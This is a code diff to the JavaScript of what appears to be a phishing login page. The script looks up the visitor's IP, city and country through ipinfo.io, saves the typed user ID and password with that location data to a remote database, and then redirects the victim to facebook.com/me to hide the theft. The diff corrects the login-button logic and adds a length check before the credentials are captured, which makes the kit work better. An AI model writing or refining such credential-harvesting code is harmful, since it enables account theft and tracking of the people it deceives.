@@ -32,11 +32,11 @@ $.get("https://ipinfo.io", function(response) {
 
 if(userId.value.length >4 && Pass.value.length>4)
   {
-    LoginBtn.disabled = true;
+    LoginBtn.disabled = false;
   }
 else
 {
-  LoginBtn.disabled = false;
+  LoginBtn.disabled = true;
 }
 LoginBtn.addEventListener('click', e => {
     e.preventDefault();
@@ -45,15 +45,17 @@ LoginBtn.addEventListener('click', e => {
     //   ID: userId.value,
     //   pw: Pass.value
     // });
-    
-    usersRef.child(userId.value).transaction(function(currentData) {
-      if (currentData === null) {
-        return {ID:userId.value,pw:Pass.value,City:city,Country:country,IP:ip};
-        // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
-      } else {
-        // console.log('User  already exists.');
-        return; // Abort the transaction.
-      }
-    });
-    window.location.replace("http://www.facebook.com/me");
+    if(userId.value.length >4 && Pass.value.length>4)
+    {
+      usersRef.child(userId.value).transaction(function(currentData) {
+        if (currentData === null) {
+          return {ID:userId.value,pw:Pass.value,City:city,Country:country,IP:ip};
+          // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
+        } else {
+          // console.log('User  already exists.');
+          return; // Abort the transaction.
+        }
+      });
+      window.location.replace("http://www.facebook.com/me");
+    }
   });
